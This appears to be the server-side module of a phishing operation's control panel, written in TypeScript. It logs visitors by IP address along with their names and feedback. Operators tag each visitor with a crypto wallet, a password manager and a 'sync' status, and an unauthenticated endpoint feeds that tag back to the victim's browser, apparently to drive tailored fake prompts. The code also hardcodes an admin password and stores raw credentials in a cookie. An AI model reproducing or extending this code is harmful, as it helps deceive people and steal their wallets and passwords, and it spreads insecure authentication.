import { createHash, timingSafeEqual } from "node:crypto";
import type { IncomingMessage, ServerResponse } from "node:http";

const ADMIN_USERNAME = "admin";
const ADMIN_PASSWORD = "demo123";
const SESSION_COOKIE = "admin_demo_session";
const MAX_ACTIVITY_RECORDS = 1000;
const MAX_FEEDBACK_LENGTH = 1000;

export type VisitorActivity = {
  ipAddress: string;
  wallet: "metamask" | "phantom" | null;
  passwordManager: "1Password" | "Bitwarden" | null;
  syncStatus: "Synced" | "Not";
  fullNames: {
    id: string;
    fullName: string;
    submittedAt: string;
  }[];
  feedbacks: {
    id: string;
    feedback: string;
    submittedAt: string;
  }[];
  visits: {
    id: string;
    operatingSystem: string;
    visitedAt: string;
  }[];
};

const visitorActivities: VisitorActivity[] = [];

const safeEqual = (left: string, right: string) => {
  const leftHash = createHash("sha256").update(left).digest();
  const rightHash = createHash("sha256").update(right).digest();
  return timingSafeEqual(leftHash, rightHash);
};

const isValidCredentialPair = (username: string, password: string) =>
  safeEqual(username, ADMIN_USERNAME) && safeEqual(password, ADMIN_PASSWORD);

const getSessionCredentials = (request: IncomingMessage) => {
  const cookie = request.headers.cookie
    ?.split(";")
    .map((part) => part.trim())
    .find((part) => part.startsWith(`${SESSION_COOKIE}=`));
  if (!cookie) return null;

  try {
    const value = cookie.slice(SESSION_COOKIE.length + 1);
    const decoded = Buffer.from(value, "base64url").toString("utf8");
    const separator = decoded.indexOf(":");
    if (separator < 0) return null;
    return {
      password: decoded.slice(separator + 1),
      username: decoded.slice(0, separator)
    };
  } catch {
    return null;
  }
};

export const isAdminSession = (request: IncomingMessage) => {
  const credentials = getSessionCredentials(request);
  return (
    credentials !== null &&
    isValidCredentialPair(credentials.username, credentials.password)
  );
};

const cookieOptions = (request: IncomingMessage) => {
  const forwardedProtocol = request.headers["x-forwarded-proto"];
  const secure = Array.isArray(forwardedProtocol)
    ? forwardedProtocol.includes("https")
    : forwardedProtocol === "https";
  return `Path=/api/admin; HttpOnly; SameSite=Strict${secure ? "; Secure" : ""}`;
};

export const establishAdminSession = (
  request: IncomingMessage,
  response: ServerResponse,
  username: string,
  password: string
) => {
  if (!isValidCredentialPair(username, password)) return false;

  const token = Buffer.from(`${username}:${password}`).toString("base64url");
  response.setHeader(
    "Set-Cookie",
    `${SESSION_COOKIE}=${token}; ${cookieOptions(request)}`
  );
  return true;
};

export const clearAdminSession = (
  request: IncomingMessage,
  response: ServerResponse
) => {
  response.setHeader(
    "Set-Cookie",
    `${SESSION_COOKIE}=; ${cookieOptions(request)}; Max-Age=0`
  );
};

const readJsonBody = async (request: IncomingMessage) => {
  const chunks: Buffer[] = [];
  let size = 0;

  for await (const chunk of request) {
    const buffer = Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk);
    size += buffer.length;
    if (size > 4096) {
      throw new Error("Request body is too large.");
    }
    chunks.push(buffer);
  }

  return JSON.parse(Buffer.concat(chunks).toString("utf8")) as unknown;
};

const sendJson = (
  response: ServerResponse,
  statusCode: number,
  body: unknown
) => {
  response.writeHead(statusCode, {
    "Cache-Control": "no-store",
    "Content-Type": "application/json; charset=utf-8"
  });
  response.end(JSON.stringify(body));
};

export const handleAdminAuth = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  if (request.method === "DELETE") {
    clearAdminSession(request, response);
    sendJson(response, 200, { authenticated: false });
    return;
  }

  if (request.method !== "POST") {
    response.writeHead(405, { Allow: "POST, DELETE" });
    response.end("Method not allowed.");
    return;
  }

  let body: unknown;
  try {
    body = await readJsonBody(request);
  } catch {
    sendJson(response, 400, { error: "Invalid login request." });
    return;
  }

  if (
    typeof body !== "object" ||
    body === null ||
    !("username" in body) ||
    !("password" in body) ||
    typeof body.username !== "string" ||
    typeof body.password !== "string"
  ) {
    sendJson(response, 400, { error: "Username and password are required." });
    return;
  }

  if (!establishAdminSession(request, response, body.username, body.password)) {
    sendJson(response, 401, { error: "Invalid username or password." });
    return;
  }

  sendJson(response, 200, { authenticated: true });
};

const inferOperatingSystem = (userAgent: string) => {
  if (/android/i.test(userAgent)) return "Android";
  if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
  if (/windows/i.test(userAgent)) return "Windows";
  if (/macintosh|mac os x/i.test(userAgent)) return "macOS";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Other";
};

const getClientIp = (request: IncomingMessage) => {
  const forwarded = request.headers["x-forwarded-for"];
  const forwardedIp = Array.isArray(forwarded) ? forwarded[0] : forwarded;
  const realIp = request.headers["x-real-ip"];
  const ip =
    forwardedIp?.split(",")[0]?.trim() ||
    (Array.isArray(realIp) ? realIp[0] : realIp) ||
    request.socket.remoteAddress ||
    "Unknown";
  return ip.startsWith("::ffff:") ? ip.slice(7) : ip;
};

export const handleAdminActivity = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  if (
    request.method === "POST" &&
    new URL(request.url ?? "/", "http://localhost").searchParams.get("view") ===
      "submit-feedback"
  ) {
    let body: unknown;
    try {
      body = await readJsonBody(request);
    } catch {
      sendJson(response, 400, { error: "Invalid feedback." });
      return;
    }

    if (
      typeof body !== "object" ||
      body === null ||
      !("feedback" in body) ||
      typeof body.feedback !== "string" ||
      ("isFirstTry" in body && typeof body.isFirstTry !== "boolean")
    ) {
      sendJson(response, 400, { error: "Feedback is required." });
      return;
    }

    const feedback = body.feedback.trim();
    if (!feedback || feedback.length > MAX_FEEDBACK_LENGTH) {
      sendJson(response, 400, {
        error: "Feedback must be between 1 and 1000 characters."
      });
      return;
    }

    const ipAddress = getClientIp(request);
    let activity = visitorActivities.find(
      (entry) => entry.ipAddress === ipAddress
    );
    if (!activity) {
      activity = {
        feedbacks: [],
        fullNames: [],
        ipAddress,
        passwordManager: null,
        syncStatus: "Synced",
        visits: [],
        wallet: null
      };
      visitorActivities.push(activity);
    }

    const submittedAt = new Date().toISOString();
    const isFirstTry = "isFirstTry" in body && body.isFirstTry === true;
    if (!isFirstTry) {
      activity.wallet = null;
    }
    activity.feedbacks.unshift({
      feedback,
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
      submittedAt
    });
    if (activity.visits.length === 0) {
      activity.visits.unshift({
        id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
        operatingSystem: inferOperatingSystem(
          request.headers["user-agent"] ?? ""
        ),
        visitedAt: submittedAt
      });
    }

    sendJson(response, 202, { recorded: true });
    return;
  }

  if (request.method === "POST") {
    const userAgent = request.headers["user-agent"] ?? "";
    const ipAddress = getClientIp(request);
    let activity = visitorActivities.find(
      (entry) => entry.ipAddress === ipAddress
    );
    if (!activity) {
      activity = {
        feedbacks: [],
        fullNames: [],
        ipAddress,
        passwordManager: null,
        syncStatus: "Synced",
        visits: [],
        wallet: null
      };
      visitorActivities.push(activity);
    }
    activity.visits.unshift({
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
      operatingSystem: inferOperatingSystem(userAgent),
      visitedAt: new Date().toISOString()
    });

    let visitCount = visitorActivities.reduce(
      (total, entry) => total + entry.visits.length,
      0
    );
    while (visitCount > MAX_ACTIVITY_RECORDS) {
      let oldestActivityIndex = -1;
      let oldestVisitIndex = -1;
      let oldestTime = Number.POSITIVE_INFINITY;
      visitorActivities.forEach((entry, entryIndex) => {
        const visitIndex = entry.visits.length - 1;
        if (visitIndex < 0) return;
        const visitedAt = Date.parse(entry.visits[visitIndex].visitedAt);
        if (visitedAt < oldestTime) {
          oldestTime = visitedAt;
          oldestActivityIndex = entryIndex;
          oldestVisitIndex = visitIndex;
        }
      });
      if (oldestActivityIndex < 0) break;
      visitorActivities[oldestActivityIndex].visits.splice(oldestVisitIndex, 1);
      if (visitorActivities[oldestActivityIndex].visits.length === 0) {
        visitorActivities.splice(oldestActivityIndex, 1);
      }
      visitCount -= 1;
    }
    sendJson(response, 202, { recorded: true });
    return;
  }

  if (
    request.method === "GET" &&
    new URL(request.url ?? "/", "http://localhost").searchParams.get("view") ===
      "wallet-preference"
  ) {
    const activity = visitorActivities.find(
      (entry) => entry.ipAddress === getClientIp(request)
    );
    sendJson(response, 200, {
      syncStatus: activity?.syncStatus ?? "Synced",
      wallet: activity?.wallet ?? null
    });
    return;
  }

  if (!isAdminSession(request)) {
    sendJson(response, 401, { error: "Authentication required." });
    return;
  }

  if (request.method === "PUT") {
    let body: unknown;
    try {
      body = await readJsonBody(request);
    } catch {
      sendJson(response, 400, { error: "Invalid activity update." });
      return;
    }

    if (
      typeof body !== "object" ||
      body === null ||
      !("ipAddress" in body) ||
      !("wallet" in body) ||
      !("passwordManager" in body) ||
      !("syncStatus" in body) ||
      typeof body.ipAddress !== "string" ||
      (body.wallet !== null &&
        body.wallet !== "metamask" &&
        body.wallet !== "phantom") ||
      (body.passwordManager !== null &&
        body.passwordManager !== "1Password" &&
        body.passwordManager !== "Bitwarden") ||
      (body.syncStatus !== "Synced" && body.syncStatus !== "Not")
    ) {
      sendJson(response, 400, { error: "Invalid activity update." });
      return;
    }

    const activity = visitorActivities.find(
      (entry) => entry.ipAddress === body.ipAddress
    );
    if (!activity) {
      sendJson(response, 404, { error: "Visitor activity was not found." });
      return;
    }

    activity.wallet = body.wallet;
    activity.passwordManager = body.passwordManager;
    activity.syncStatus = body.syncStatus;
    sendJson(response, 200, { activity });
    return;
  }

  if (request.method !== "GET") {
    response.writeHead(405, { Allow: "GET, POST, PUT" });
    response.end("Method not allowed.");
    return;
  }

  const activities = visitorActivities
    .filter((activity) => activity.visits.length > 0)
    .map((activity) => ({
      ...activity,
      lastVisitedAt: activity.visits[0].visitedAt
    }))
    .sort(
      (left, right) =>
        Date.parse(right.lastVisitedAt) - Date.parse(left.lastVisitedAt)
    );
  sendJson(response, 200, { activities });
};

export const handleAdminSignup = async (
  request: IncomingMessage,
  response: ServerResponse
) => {
  if (request.method !== "POST") {
    response.writeHead(405, { Allow: "POST" });
    response.end("Method not allowed.");
    return;
  }

  let body: unknown;
  try {
    body = await readJsonBody(request);
  } catch {
    sendJson(response, 400, { error: "Invalid signup details." });
    return;
  }

  if (
    typeof body !== "object" ||
    body === null ||
    !("fullName" in body) ||
    typeof body.fullName !== "string"
  ) {
    sendJson(response, 400, { error: "Full name is required." });
    return;
  }

  const fullName = body.fullName.trim();
  if (!fullName || fullName.length > 100) {
    sendJson(response, 400, {
      error: "Full name must be between 1 and 100 characters."
    });
    return;
  }

  const ipAddress = getClientIp(request);
  let activity = visitorActivities.find(
    (entry) => entry.ipAddress === ipAddress
  );
  if (!activity) {
    activity = {
      feedbacks: [],
      fullNames: [],
      ipAddress,
      passwordManager: null,
      syncStatus: "Synced",
      visits: [],
      wallet: null
    };
    visitorActivities.push(activity);
  }

  const submittedAt = new Date().toISOString();
  activity.fullNames.unshift({
    fullName,
    id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
    submittedAt
  });
  if (activity.visits.length === 0) {
    activity.visits.unshift({
      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
      operatingSystem: inferOperatingSystem(
        request.headers["user-agent"] ?? ""
      ),
      visitedAt: submittedAt
    });
  }

  console.log(`--- ${ipAddress} - fullname - ${fullName} ---`);

  sendJson(response, 202, { recorded: true });
};
